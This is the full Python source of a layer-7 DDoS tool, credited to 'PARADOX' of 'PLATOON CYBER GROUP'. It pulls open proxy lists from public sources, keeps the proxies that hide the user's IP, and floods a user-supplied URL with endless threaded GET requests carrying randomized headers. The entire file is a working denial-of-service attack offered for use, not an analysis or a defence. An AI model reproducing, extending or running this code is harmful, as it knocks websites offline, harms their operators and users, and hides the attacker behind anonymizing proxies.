import requests as r, os, threading, random, click, fake_headers, time
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers
version = '1.1.7 stable :.:.'

iphosts = [
    'https://wtfismyip.com/text',
    'https://ipinfo.io/ip',
    'https://ipv4.icanhazip.com/',
    'https://myexternalip.com/raw',
    'https://ifconfig.io/ip',
    'https://ipecho.net/plain'
]

global myip
myip = r.post(random.choice(iphosts)).text

class bcolors:
        OKGREEN = '\33[92m'
        WARNING = '\33[0;33m'
        FAIL = '\33[91m'
        ENDC = '\33[0m'
        LITBU = '\33[94m'
        YELLOW = '\33[3;33m'
        CYAN = '\33[0;36'
        colors = ['\33[92m', '\33[91m', '\33[0;33m']
        RAND = random.choice(colors)


def clear():
        if os.name == 'nt':
                os.system('cls')
        else:
                os.system('clear')

banner = """
 ╔════════════════════════════════╗
║                                ║
║██████╗░██████╗░░█████╗░░██████╗║
║██╔══██╗██╔══██╗██╔══██╗██╔════╝║
║██║░░██║██║░░██║██║░░██║╚█████╗░║
║██║░░██║██║░░██║██║░░██║░╚═══██╗║
║██████╔╝██████╔╝╚█████╔╝██████╔╝║
║╚═════╝░╚═════╝░░╚════╝░╚═════╝░║
╚════════════════════════════════╝
"""
smallb = """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃AUTHOR : PARADOX             ┃
┃LAYER  : 7                   ┃
┃TEAM   : PLATOON CYBER GROUP ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""

def logo():
    os.system("clear")
    print(Fore.RED+ banner)
    print(Fore.GREEN+ smallb)


def check_prox(array, url):
        #myip = r.post(random.choice(iphosts)).text
        for prox in array:
                t = threading.Thread(target=check, args=(myip, prox, url))
                t.start()

def check(myip, prox, url):
        try:
                ipx = r.get(random.choice(iphosts), proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
                if ipx == myip:
                        pass
                else:
                        print(Fore.RED+Back.RED+"{} good proxy".format(prox)+Style.RESET_ALL)
                        t = threading.Thread(target=ddos, args=(prox, url))
                        t.start()
        except:
                pass

def ddos(prox, url):
        proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
        colors = ["\1B[31m", "\1B[32m", "\1B[33m", "\1B[34m", "\1B[35m", "\1B[36m", "\1B[37m"]
        color = random.choice(colors)
        while True:
                headers1 = Headers(headers=True).generate()
                t = threading.Thread(target=start_ddos, args=(prox, url, headers1, proxies, color))
                t.start()

def start_ddos(prox, url, headers1, proxies, color):
        try:
                s1 = r.Session()
                req1 = s1.get(url, headers=headers1, proxies=proxies)
                if req1.status_code == 200:
                        if "<title>Just a moment...</title>" in req1.text:
                                pass
                        else:
                                print(Fore.RED+"{} sent requests...".format(prox))
        except:
                pass

@click.command()
@click.option('--proxy', '-p', help="<File with a proxy>")
@click.option('--url', '-u', help="<URL>")
def main(proxy, url):
        clear()
        logo()
        if url == None:
                print(Fore.GREEN+ "")
                url = input(Fore.RED+ """
╔══════[TARGET]
╚═══>\033[95m """)
        if url[:4] != "http":
                exit()
        if proxy == None:
                while True:
                        req1 = r.get("https://api.proxyscrape.com/v2/?request=displayproxies").text
                        req2 = r.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt").text
                        req3 = r.get("https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt").text
                        req4 = r.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt").text
                        req5 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
                        req6 = r.get("https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt").text
                        req = req1 + req2 + req3 + req4 + req5 + req6
                        array = req.split()
                        print(Fore.BLUE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
                        check_prox(array, url)
        else:
                try:
                        fx = open(proxy)
                        array = fx.read().split()
                        print("Found {} proxies in {}.\Checking proxies...".format(len(array), proxy))
                        check_prox(array, url)
                except FileNotFoundError:
                        print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
                        exit()

main()
